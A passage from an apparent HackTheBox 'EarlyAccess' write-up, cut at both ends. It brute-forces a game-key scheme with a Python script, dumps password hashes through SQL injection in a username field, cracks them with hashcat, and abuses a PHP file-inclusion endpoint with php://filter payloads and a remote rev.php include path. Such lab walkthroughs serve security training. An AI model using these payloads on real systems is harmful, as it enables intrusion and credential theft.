<span id="cb26-3"><a href="#cb26-3" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> <span class="bu">sum</span>([<span class="bu">sum</span>(<span class="bu">bytearray</span>(g.encode())) <span class="cf">for</span> g <span class="kw">in</span> gs])</span>
<span id="cb26-4"><a href="#cb26-4" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb26-5"><a href="#cb26-5" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> cs_valid(<span class="va">self</span>) <span class="op">-&gt;</span> <span class="bu">bool</span>:</span>
<span id="cb26-6"><a href="#cb26-6" aria-hidden="true" tabindex="-1"></a>        cs <span class="op">=</span> <span class="bu">int</span>(<span class="va">self</span>.key.split(<span class="st">'-'</span>)[<span class="op">-</span><span class="dv">1</span>])</span>
<span id="cb26-7"><a href="#cb26-7" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> <span class="va">self</span>.calc_cs() <span class="op">==</span> cs</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<div class="sourceCode" id="cb27"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb27-1"><a href="#cb27-1" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;&gt;</span> key <span class="op">=</span> <span class="st">"KEY01-1J1I1-XPAA0-GAME1-1301"</span></span>
<span id="cb27-2"><a href="#cb27-2" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;&gt;</span> gs <span class="op">=</span> key.split(<span class="st">'-'</span>)[:<span class="op">-</span><span class="dv">1</span>]</span>
<span id="cb27-3"><a href="#cb27-3" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;&gt;</span> <span class="bu">print</span>(gs)</span>
<span id="cb27-4"><a href="#cb27-4" aria-hidden="true" tabindex="-1"></a>[<span class="st">'KEY01'</span>, <span class="st">'1J1I1'</span>, <span class="st">'XPAA0'</span>, <span class="st">'GAME1'</span>]</span>
<span id="cb27-5"><a href="#cb27-5" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;&gt;</span> <span class="bu">print</span>(<span class="bu">sum</span>([<span class="bu">sum</span>(<span class="bu">bytearray</span>(g.encode())) <span class="cf">for</span> g <span class="kw">in</span> gs]))</span>
<span id="cb27-6"><a href="#cb27-6" aria-hidden="true" tabindex="-1"></a><span class="dv">1301</span></span>
<span id="cb27-7"><a href="#cb27-7" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;&gt;</span> cs <span class="op">=</span> <span class="bu">int</span>(key.split(<span class="st">'-'</span>)[<span class="op">-</span><span class="dv">1</span>])</span>
<span id="cb27-8"><a href="#cb27-8" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;&gt;</span> <span class="bu">print</span>(cs)</span>
<span id="cb27-9"><a href="#cb27-9" aria-hidden="true" tabindex="-1"></a><span class="dv">1301</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>A valid key should be: <strong>KEY01-1J1I1-XPAA0-GAME1-1301</strong></p>
<p>Testing it out, and we’ve reversed a key!</p>
<div class="sourceCode" id="cb28"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb28-1"><a href="#cb28-1" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[/git/htb/earlyaccess]</span></span>
<span id="cb28-2"><a href="#cb28-2" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> python3 validate.py KEY01-1J1I1-XPAA0-GAME1-1301</span>
<span id="cb28-3"><a href="#cb28-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Entered</span> key is valid!</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<hr>
</section>
<section id="step-4" class="level3">
<h3 class="anchored" data-anchor-id="step-4">Step 4</h3>
<p>Even though the key is correct in our offline validator, it fails when validating it online. This probably have something to do with this. &gt;Since the API has been down a lot lately, we have come up with an temporary solution. As requested, an offline backup of the game-key validator algorithm is now available to all administrative users. To use this, the magic_num must be entered into the validator app.</p>
<p>And in the code we find: <code>magic_num = 346 # TODO: Sync with API (api generates magic_num every 30min)</code></p>
<p>![[earlyaccess-03.png]]</p>
<p>We need to find a way to extract the <code>magic_num</code> value from the API, or by other means. After trying to find and/or extract the <code>magic_num</code> for a while without success, I decided to go the scripting route and brute force all possible keys. The unknown variable only affects two characters in the third group, plus the last checksum group of the key.</p>
<div class="sourceCode" id="cb29"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb29-1"><a href="#cb29-1" aria-hidden="true" tabindex="-1"></a>┌──(void㉿void)<span class="op">-</span>[<span class="op">/</span>git<span class="op">/</span>htb<span class="op">/</span>earlyaccess]</span>
<span id="cb29-2"><a href="#cb29-2" aria-hidden="true" tabindex="-1"></a>└─$ cat m.py </span>
<span id="cb29-3"><a href="#cb29-3" aria-hidden="true" tabindex="-1"></a><span class="co">#!/usr/bin/env python3</span></span>
<span id="cb29-4"><a href="#cb29-4" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb29-5"><a href="#cb29-5" aria-hidden="true" tabindex="-1"></a>num <span class="op">=</span> <span class="dv">955</span>                   <span class="co"># Ascii decimal value of group 1,2,4</span></span>
<span id="cb29-6"><a href="#cb29-6" aria-hidden="true" tabindex="-1"></a>valid_key <span class="op">=</span> <span class="st">"KEY01-1J1I1-XPAA0-GAME1-1301"</span></span>
<span id="cb29-7"><a href="#cb29-7" aria-hidden="true" tabindex="-1"></a>g1 <span class="op">=</span> valid_key.split(<span class="st">'-'</span>)[<span class="dv">0</span>]</span>
<span id="cb29-8"><a href="#cb29-8" aria-hidden="true" tabindex="-1"></a>g2 <span class="op">=</span> valid_key.split(<span class="st">'-'</span>)[<span class="dv">1</span>]</span>
<span id="cb29-9"><a href="#cb29-9" aria-hidden="true" tabindex="-1"></a>g3 <span class="op">=</span> valid_key.split(<span class="st">'-'</span>)[<span class="dv">2</span>]</span>
<span id="cb29-10"><a href="#cb29-10" aria-hidden="true" tabindex="-1"></a>g4 <span class="op">=</span> valid_key.split(<span class="st">'-'</span>)[<span class="dv">3</span>]</span>
<span id="cb29-11"><a href="#cb29-11" aria-hidden="true" tabindex="-1"></a>g5 <span class="op">=</span> valid_key.split(<span class="st">'-'</span>)[<span class="dv">4</span>]</span>
<span id="cb29-12"><a href="#cb29-12" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb29-13"><a href="#cb29-13" aria-hidden="true" tabindex="-1"></a>g3_a <span class="op">=</span> [<span class="st">'X'</span>, <span class="st">'P'</span>, <span class="st">'A'</span>, <span class="st">'A'</span>, <span class="st">'0'</span>]</span>
<span id="cb29-14"><a href="#cb29-14" aria-hidden="true" tabindex="-1"></a>g32 <span class="op">=</span> <span class="bu">ord</span>(<span class="st">'A'</span>)</span>
<span id="cb29-15"><a href="#cb29-15" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb29-16"><a href="#cb29-16" aria-hidden="true" tabindex="-1"></a><span class="cf">while</span> g32 <span class="op">&lt;=</span> <span class="bu">ord</span>(<span class="st">'Z'</span>):</span>
<span id="cb29-17"><a href="#cb29-17" aria-hidden="true" tabindex="-1"></a>    </span>
<span id="cb29-18"><a href="#cb29-18" aria-hidden="true" tabindex="-1"></a>    g33 <span class="op">=</span> <span class="bu">ord</span>(<span class="st">'A'</span>)</span>
<span id="cb29-19"><a href="#cb29-19" aria-hidden="true" tabindex="-1"></a>    <span class="cf">while</span> g33 <span class="op">&lt;=</span> <span class="bu">ord</span>(<span class="st">'Z'</span>):</span>
<span id="cb29-20"><a href="#cb29-20" aria-hidden="true" tabindex="-1"></a>        g3_a[<span class="dv">3</span>] <span class="op">=</span> <span class="bu">chr</span>(g33)</span>
<span id="cb29-21"><a href="#cb29-21" aria-hidden="true" tabindex="-1"></a>        magic_num <span class="op">=</span> (<span class="bu">ord</span>(g3_a[<span class="dv">0</span>]) <span class="op">+</span> <span class="bu">ord</span>(g3_a[<span class="dv">1</span>]) <span class="op">+</span> <span class="bu">ord</span>(g3_a[<span class="dv">2</span>]) <span class="op">+</span> <span class="bu">ord</span>(g3_a[<span class="dv">3</span>]) <span class="op">+</span> <span class="bu">ord</span>(g3_a[<span class="dv">4</span>]))</span>
<span id="cb29-22"><a href="#cb29-22" aria-hidden="true" tabindex="-1"></a>        checksum <span class="op">=</span> magic_num <span class="op">+</span> num</span>
<span id="cb29-23"><a href="#cb29-23" aria-hidden="true" tabindex="-1"></a>        <span class="bu">print</span>(<span class="ss">f"</span><span class="sc">{</span>g1<span class="sc">}</span><span class="ss">-</span><span class="sc">{</span>g2<span class="sc">}</span><span class="ss">-XP</span><span class="sc">{</span>g3_a[<span class="dv">2</span>]<span class="sc">}{</span>g3_a[<span class="dv">3</span>]<span class="sc">}</span><span class="ss">0-</span><span class="sc">{</span>g4<span class="sc">}</span><span class="ss">-</span><span class="sc">{</span>checksum<span class="sc">}</span><span class="ss">"</span>)</span>
<span id="cb29-24"><a href="#cb29-24" aria-hidden="true" tabindex="-1"></a>        g33 <span class="op">+=</span><span class="dv">1</span></span>
<span id="cb29-25"><a href="#cb29-25" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb29-26"><a href="#cb29-26" aria-hidden="true" tabindex="-1"></a>    g3_a[<span class="dv">2</span>] <span class="op">=</span> <span class="bu">chr</span>(g32)</span>
<span id="cb29-27"><a href="#cb29-27" aria-hidden="true" tabindex="-1"></a>    g32 <span class="op">+=</span><span class="dv">1</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<div class="sourceCode" id="cb30"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb30-1"><a href="#cb30-1" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[/git/htb/earlyaccess]</span></span>
<span id="cb30-2"><a href="#cb30-2" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> sudo python3 m.py               </span>
<span id="cb30-3"><a href="#cb30-3" aria-hidden="true" tabindex="-1"></a><span class="ex">KEY01-1J1I1-XPAA0-GAME1-1301</span></span>
<span id="cb30-4"><a href="#cb30-4" aria-hidden="true" tabindex="-1"></a><span class="ex">KEY01-1J1I1-XPAB0-GAME1-1302</span></span>
<span id="cb30-5"><a href="#cb30-5" aria-hidden="true" tabindex="-1"></a><span class="ex">KEY01-1J1I1-XPAC0-GAME1-1303</span></span>
<span id="cb30-6"><a href="#cb30-6" aria-hidden="true" tabindex="-1"></a><span class="ex">KEY01-1J1I1-XPAD0-GAME1-1304</span></span>
<span id="cb30-7"><a href="#cb30-7" aria-hidden="true" tabindex="-1"></a><span class="ex">KEY01-1J1I1-XPAE0-GAME1-1305</span></span>
<span id="cb30-8"><a href="#cb30-8" aria-hidden="true" tabindex="-1"></a><span class="ex">KEY01-1J1I1-XPAF0-GAME1-1306</span></span>
<span id="cb30-9"><a href="#cb30-9" aria-hidden="true" tabindex="-1"></a><span class="ex">KEY01-1J1I1-XPAG0-GAME1-1307</span></span>
<span id="cb30-10"><a href="#cb30-10" aria-hidden="true" tabindex="-1"></a><span class="ex">KEY01-1J1I1-XPAH0-GAME1-1308</span></span>
<span id="cb30-11"><a href="#cb30-11" aria-hidden="true" tabindex="-1"></a><span class="ex">KEY01-1J1I1-XPAI0-GAME1-1309</span></span>
<span id="cb30-12"><a href="#cb30-12" aria-hidden="true" tabindex="-1"></a><span class="ex">KEY01-1J1I1-XPAJ0-GAME1-1310</span></span>
<span id="cb30-13"><a href="#cb30-13" aria-hidden="true" tabindex="-1"></a><span class="ex">..</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<div class="sourceCode" id="cb31"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb31-1"><a href="#cb31-1" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[/git/htb/earlyaccess]</span></span>
<span id="cb31-2"><a href="#cb31-2" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> wc <span class="at">-l</span> all_keys.txt </span>
<span id="cb31-3"><a href="#cb31-3" aria-hidden="true" tabindex="-1"></a><span class="ex">676</span> all_keys.txt</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>The script successfully brute forced 676 possible valid keys, depending on what the <code>magic_num</code> variable is set to. Fire up Burp, and brute force using intruder (remember to follow redirects).</p>
<p>Out of the 676 total keys we get <strong>11</strong> keys that pass as valid! However nothing really happens. ![[earlyaccess-04.png]]</p>
<p>Trying to brute force a key as a user (<code>p3test@test.se:123123123</code>) however gives us access to the <code>Game</code> tab in the page header.</p>
<hr>
</section>
<section id="step-5" class="level3">
<h3 class="anchored" data-anchor-id="step-5">Step 5</h3>
<p>Press the tab and login to https://game.earlyaccess.htb with your account. In the Global Leaderboard we find three users: - chr0x6eos@earlyaccess.htb - farbs@earlyaccess.htb - firefart@earlyaccess.htb</p>
<p>On the <code>Scoreboard</code> we can see our own results. In <strong>step 2</strong> we found a clue that the scoreboard would break to SQL input, so if we change our username to <code>'</code> and visit the scoreboard again we get the output:</p>
<blockquote class="blockquote">
<p><strong>Error</strong></p>
<p>SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ’’’‘) ORDER BY scoreboard.score DESC LIMIT 11’ at line 1</p>
</blockquote>
<p>Trying to understand the query it probably looks something like this: <code>select from game where username=('dude') ORDER BY scoreboard.score DESC LIMIT 11</code></p>
<p>To input only <code>'</code> as user wouldn’t make sense in that query, we probably need to close of the parenthesis first and then do our injection. Changing the username to <code>') order by 4;-- -#</code> gives us the error: &gt;<strong>Error</strong> &gt; &gt;SQLSTATE[42S22]: Column not found: 1054 Unknown column ‘4’ in ‘order clause’</p>
<p>Meaning the number of columns is 3 (as order by 3 gives no output). Enumerate the database using <code>') union all select RANDOM-SQL-COMMAND,2,3;-- -#</code>.</p>
<table class="caption-top table">
<colgroup>
<col style="width: 50%">
<col style="width: 50%">
</colgroup>
<thead>
<tr class="header">
<th>Command</th>
<th>Output</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>@<span class="citation" data-cites="version">@version</span></td>
<td>8.0.25</td>
</tr>
<tr class="even">
<td>user()</td>
<td>game@172.18.0.102</td>
</tr>
<tr class="odd">
<td>database()</td>
<td>db</td>
</tr>
<tr class="even">
<td>table_name FROM information_schema.TABLES WHERE table_schema=‘db’</td>
<td>failed_logins, scoreboard, users</td>
</tr>
<tr class="odd">
<td>column_name FROM information_schema.COLUMNS WHERE table_name=‘users’</td>
<td>id, name, email, password, role, key, created_at, updated_at</td>
</tr>
<tr class="even">
<td>concat(name,0x3a,password),2,3 FROM users</td>
<td>admin:618292e936625aca8df61d5fff5c06837c49e491 chr0x6eos:d997b2a79e4fc48183f59b2ce1cee9da18aa5476 firefart:584204a0bbe5e392173d3dfdf63a322c83fe97cd farbs:290516b5f6ad161a86786178934ad5f933242361</td>
</tr>
</tbody>
</table>
<p>Add all the hashes to a file and crack them using hashcat.</p>
<div class="sourceCode" id="cb32"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb32-1"><a href="#cb32-1" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[/git/htb/earlyaccess]</span></span>
<span id="cb32-2"><a href="#cb32-2" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> cat hashes.hash </span>
<span id="cb32-3"><a href="#cb32-3" aria-hidden="true" tabindex="-1"></a><span class="ex">618292e936625aca8df61d5fff5c06837c49e491</span></span>
<span id="cb32-4"><a href="#cb32-4" aria-hidden="true" tabindex="-1"></a><span class="ex">d997b2a79e4fc48183f59b2ce1cee9da18aa5476</span></span>
<span id="cb32-5"><a href="#cb32-5" aria-hidden="true" tabindex="-1"></a><span class="ex">584204a0bbe5e392173d3dfdf63a322c83fe97cd</span> </span>
<span id="cb32-6"><a href="#cb32-6" aria-hidden="true" tabindex="-1"></a><span class="ex">290516b5f6ad161a86786178934ad5f933242361</span></span>
<span id="cb32-7"><a href="#cb32-7" aria-hidden="true" tabindex="-1"></a>   </span>
<span id="cb32-8"><a href="#cb32-8" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[/git/htb/earlyaccess]</span></span>
<span id="cb32-9"><a href="#cb32-9" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> echo <span class="at">-n</span> 618292e936625aca8df61d5fff5c06837c49e491 <span class="kw">|</span> <span class="fu">wc</span> <span class="at">-c</span>      </span>
<span id="cb32-10"><a href="#cb32-10" aria-hidden="true" tabindex="-1"></a><span class="ex">40</span></span>
<span id="cb32-11"><a href="#cb32-11" aria-hidden="true" tabindex="-1"></a>   </span>
<span id="cb32-12"><a href="#cb32-12" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[/git/htb/earlyaccess]</span></span>
<span id="cb32-13"><a href="#cb32-13" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> hashcat <span class="at">-a0</span> <span class="at">-m100</span> hashes.hash /usr/share/wordlists/rockyou.txt</span>
<span id="cb32-14"><a href="#cb32-14" aria-hidden="true" tabindex="-1"></a><span class="ex">..</span></span>
<span id="cb32-15"><a href="#cb32-15" aria-hidden="true" tabindex="-1"></a><span class="ex">618292e936625aca8df61d5fff5c06837c49e491:gameover</span></span>
<span id="cb32-16"><a href="#cb32-16" aria-hidden="true" tabindex="-1"></a><span class="ex">Approaching</span> final keyspace <span class="at">-</span> workload adjusted.  </span>
<span id="cb32-17"><a href="#cb32-17" aria-hidden="true" tabindex="-1"></a>                         </span>
<span id="cb32-18"><a href="#cb32-18" aria-hidden="true" tabindex="-1"></a><span class="ex">Session..........:</span> hashcat</span>
<span id="cb32-19"><a href="#cb32-19" aria-hidden="true" tabindex="-1"></a><span class="ex">Status...........:</span> Exhausted</span>
<span id="cb32-20"><a href="#cb32-20" aria-hidden="true" tabindex="-1"></a><span class="ex">Hash.Name........:</span> SHA1</span>
<span id="cb32-21"><a href="#cb32-21" aria-hidden="true" tabindex="-1"></a><span class="ex">Hash.Target......:</span> hashes.hash</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Cracked creds = <strong>admin:gameover</strong></p>
<hr>
</section>
<section id="step-6" class="level3">
<h3 class="anchored" data-anchor-id="step-6">Step 6</h3>
<p>We are now able to login on http://dev.earlyaccess.htb using the cracked admin creds.</p>
<p>There are two tools, Hashing- and File-Tools. The hashing tool allows us to make a MD5 or SHA1 hash of a password. Capturing the request we see a POST to <code>/actions/hash.php</code>.</p>
<p>Looking on the File-Tool however there are no UI available, but applying the same logic the request should be made to <code>/actions/file.php</code>.</p>
<div class="sourceCode" id="cb33"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb33-1"><a href="#cb33-1" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[~/Documents/shells/php]</span></span>
<span id="cb33-2"><a href="#cb33-2" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> curl http://dev.earlyaccess.htb/actions/file.php                               </span>
<span id="cb33-3"><a href="#cb33-3" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>h1<span class="op">&gt;</span>ERROR:<span class="op">&lt;</span>/h1<span class="op">&gt;</span>Please <span class="ex">specify</span> file!                                                                                                                                      </span>
<span id="cb33-4"><a href="#cb33-4" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[~/Documents/shells/php]</span></span>
<span id="cb33-5"><a href="#cb33-5" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> curl http://dev.earlyaccess.htb/actions/file.php<span class="pp">?</span>file=/etc/passwd</span>
<span id="cb33-6"><a href="#cb33-6" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>h1<span class="op">&gt;</span>ERROR:<span class="op">&lt;</span>/h1<span class="op">&gt;</span>Please <span class="ex">specify</span> file!                                                                                                                    </span>
<span id="cb33-7"><a href="#cb33-7" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[~/Documents/shells/php]</span></span>
<span id="cb33-8"><a href="#cb33-8" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> curl http://dev.earlyaccess.htb/actions/file.php<span class="pp">?</span>filepath=/etc/passwd</span>
<span id="cb33-9"><a href="#cb33-9" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>h1<span class="op">&gt;</span>ERROR:<span class="op">&lt;</span>/h1<span class="op">&gt;</span>For <span class="ex">security</span> reasons, reading outside the current directory is prohibited!</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>We got <strong>RFI</strong>, however we’re not allowed to read outside the current directory.</p>
<div class="sourceCode" id="cb34"><pre class="sourceCode php code-with-copy"><code class="sourceCode php"><span id="cb34-1"><a href="#cb34-1" aria-hidden="true" tabindex="-1"></a>┌──(void㉿void)<span class="op">-</span>[<span class="op">~/</span>Documents<span class="op">/</span>shells<span class="op">/</span>php]</span>
<span id="cb34-2"><a href="#cb34-2" aria-hidden="true" tabindex="-1"></a>└─$ curl <span class="op">-</span>v http<span class="ot">:</span><span class="co">//dev.earlyaccess.htb/actions/file.php?filepath=hash.php</span></span>
<span id="cb34-3"><a href="#cb34-3" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>h2<span class="op">&gt;</span>Executing <span class="fu">file</span><span class="ot">:</span><span class="op">&lt;/</span>h2<span class="op">&gt;&lt;</span>p<span class="op">&gt;</span><span class="fu">hash</span><span class="op">.</span>php<span class="op">&lt;/</span>p<span class="op">&gt;</span></span>
<span id="cb34-4"><a href="#cb34-4" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>br <span class="op">/&gt;</span></span>
<span id="cb34-5"><a href="#cb34-5" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>b<span class="op">&gt;</span>Warning<span class="op">&lt;/</span>b<span class="op">&gt;</span><span class="ot">:</span>  Cannot modify <span class="fu">header</span> information <span class="op">-</span> headers already sent by (output started at <span class="op">/</span><span class="kw">var</span><span class="op">/</span>www<span class="op">/</span>earlyaccess<span class="op">.</span>htb<span class="op">/</span>dev<span class="op">/</span>actions<span class="op">/</span><span class="fu">file</span><span class="op">.</span>php<span class="ot">:</span><span class="dv">18</span>) in <span class="op">&lt;</span>b<span class="op">&gt;/</span><span class="kw">var</span><span class="op">/</span>www<span class="op">/</span>earlyaccess<span class="op">.</span>htb<span class="op">/</span>dev<span class="op">/</span>actions<span class="op">/</span><span class="fu">hash</span><span class="op">.</span>php<span class="op">&lt;/</span>b<span class="op">&gt;</span> on line <span class="op">&lt;</span>b<span class="op">&gt;</span><span class="dv">77</span><span class="op">&lt;/</span>b<span class="op">&gt;&lt;</span>br <span class="op">/&gt;</span></span>
<span id="cb34-6"><a href="#cb34-6" aria-hidden="true" tabindex="-1"></a><span class="op">*</span> Connection <span class="co">#0 to host dev.earlyaccess.htb left intact</span></span>
<span id="cb34-7"><a href="#cb34-7" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>h2<span class="op">&gt;</span>Executed <span class="fu">file</span> successfully<span class="op">!</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>The warning message shows the absolute path: <strong>/var/www/earlyaccess.htb/dev/actions/</strong> Playing around further with the RFI we can see that the function used in the File-Tool is <strong>require_once()</strong>:</p>
<div class="sourceCode" id="cb35"><pre class="sourceCode php code-with-copy"><code class="sourceCode php"><span id="cb35-1"><a href="#cb35-1" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>b<span class="op">&gt;</span>Fatal <span class="bu">error</span><span class="op">&lt;/</span>b<span class="op">&gt;</span><span class="ot">:</span>  <span class="kw">require_once</span>()<span class="ot">:</span> Failed opening required <span class="st">'</span><span class="sc">\\</span><span class="st">10.10.14.2\share\rev.php'</span> (include_path<span class="op">=</span><span class="st">'.:.'</span>) in <span class="op">&lt;</span>b<span class="op">&gt;/</span><span class="kw">var</span><span class="op">/</span>www<span class="op">/</span>earlyaccess<span class="op">.</span>htb<span class="op">/</span>dev<span class="op">/</span>actions<span class="op">/</span><span class="fu">file</span><span class="op">.</span>php<span class="op">&lt;/</span>b<span class="op">&gt;</span> on line <span class="op">&lt;</span>b<span class="op">&gt;</span><span class="dv">19</span><span class="op">&lt;/</span>b<span class="op">&gt;</span><span class="st">```</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Reading on HackTricks: &gt;The vulnerability (LFI/RFI) occurs when the user can control in some way the file that is going to be load by the server. &gt; Vulnerable <strong>PHP functions</strong>: require, <strong>require_once</strong>, include, include_once</p>
<p>After some research I come across <code>php://filter/convert.base64-encode/resource=</code>, we can use this to extract hash.php in order to see if there’s anything that we’ve missed.</p>
<div class="sourceCode" id="cb36"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb36-1"><a href="#cb36-1" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[~/Documents/shells/php]</span></span>
<span id="cb36-2"><a href="#cb36-2" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> curl http://dev.earlyaccess.htb/actions/file.php<span class="pp">?</span>filepath=php://filter/convert.base64-encode/resource=/var/www/earlyaccess.htb/dev/actions/hash.php</span>
<span id="cb36-3"><a href="#cb36-3" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>h2<span class="op">&gt;</span>Executing <span class="ex">file:</span><span class="op">&lt;</span>/h2<span class="op">&gt;&lt;</span>p<span class="op">&gt;</span>php://filter/convert.base64-encode/resource=/var/www/earlyaccess.htb/dev/actions/hash.php<span class="op">&lt;</span>/p<span class="op">&gt;</span></span>
<span id="cb36-4"><a href="#cb36-4" aria-hidden="true" tabindex="-1"></a><span class="ex">PD9waHAKaW5jbHVkZV9vbmNlICIuLi9pbmNsdWRlcy9zZXNzaW9uLnBocCI7CgpmdW5jdGlvbiBoYXNoX3B3KCRoYXNoX2Z1bmN0aW9uLCAkcGFzc3dvcmQpCnsKICAgIC8vIERFVkVMT1BFUi1OT1RFOiBUaGVyZSBoYXMgZ290dGEgYmUgYW4gZWFzaWVyIHdheS4uLgogICAgb2Jfc3RhcnQoKTsKICAgIC8vIFVzZSBpbnB1dHRlZCBoYXNoX2Z1bmN0aW9uIHRvIGhhc2ggcGFzc3dvcmQKICAgICRoYXNoID0gQCRoYXNoX2Z1bmN0aW9uKCRwYXNzd29yZCk7CiAgICBvYl9lbmRfY2xlYW4oKTsKICAgIHJldHVybiAkaGFzaDsKfQoKdHJ5CnsKICAgIGlmKGlzc2V0KCRfUkVRVUVTVFsnYWN0aW9uJ10pKQogICAgewogICAgICAgIGlmKCRfUkVRVUVTVFsnYWN0aW9uJ10gPT09ICJ2ZXJpZnkiKQogICAgICAgIHsKICAgICAgICAgICAgLy8gVkVSSUZJRVMgJHBhc3N3b3JkIEFHQUlOU1QgJGhhc2gKCiAgICAgICAgICAgIGlmKGlzc2V0KCRfUkVRVUVTVFsnaGFzaF9mdW5jdGlvbiddKSAmJiBpc3NldCgkX1JFUVVFU1RbJ2hhc2gnXSkgJiYgaXNzZXQoJF9SRVFVRVNUWydwYXNzd29yZCddKSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgLy8gT25seSBhbGxvdyBjdXN0b20gaGFzaGVzLCBpZiBgZGVidWdgIGlzIHNldAogICAgICAgICAgICAgICAgaWYoJF9SRVFVRVNUWydoYXNoX2Z1bmN0aW9uJ10gIT09ICJtZDUiICYmICRfUkVRVUVTVFsnaGFzaF9mdW5jdGlvbiddICE9PSAic2hhMSIgJiYgIWlzc2V0KCRfUkVRVUVTVFsnZGVidWcnXSkpCiAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IEV4Y2VwdGlvbigiT25seSBNRDUgYW5kIFNIQTEgYXJlIGN1cnJlbnRseSBzdXBwb3J0ZWQhIik7CgogICAgICAgICAgICAgICAgJGhhc2ggPSBoYXNoX3B3KCRfUkVRVUVTVFsnaGFzaF9mdW5jdGlvbiddLCAkX1JFUVVFU1RbJ3Bhc3N3b3JkJ10pOwoKICAgICAgICAgICAgICAgICRfU0VTU0lPTlsndmVyaWZ5J10gPSAoJGhhc2ggPT09ICRfUkVRVUVTVFsnaGFzaCddKTsKICAgICAgICAgICAgICAgIGhlYWRlcignTG9jYXRpb246IC9ob21lLnBocD90b29sPWhhc2hpbmcnKTsKICAgICAgICAgICAgICAgIHJldHVybjsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlaWYoJF9SRVFVRVNUWydhY3Rpb24nXSA9PT0gInZlcmlmeV9maWxlIikKICAgICAgICB7CiAgICAgICAgICAgIC8vVE9ETzogSU1QTEVNRU5UIEZJTEUgVkVSSUZJQ0FUSU9OCiAgICAgICAgfQogICAgICAgIGVsc2VpZigkX1JFUVVFU1RbJ2FjdGlvbidd